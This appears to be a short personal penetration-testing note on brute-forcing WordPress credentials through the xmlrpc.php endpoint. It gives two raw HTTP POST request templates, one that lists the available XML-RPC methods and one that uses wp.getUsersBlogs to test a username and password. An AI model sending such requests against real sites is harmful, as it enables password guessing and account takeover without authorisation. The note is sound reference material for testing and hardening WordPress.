----
- Tags: #web #scripting #bash #tools #wordpress
----
You can use brute force in [[WordPress]] to tramit using POST method to the xmlrpc.php file with a XML structure like [[Wpscan]].
```xml
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```
And then, find out valid credentials using this:
```xml
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>Username</value></param> 
<param><value>Password</value></param> 
</params> 
</methodCall>
```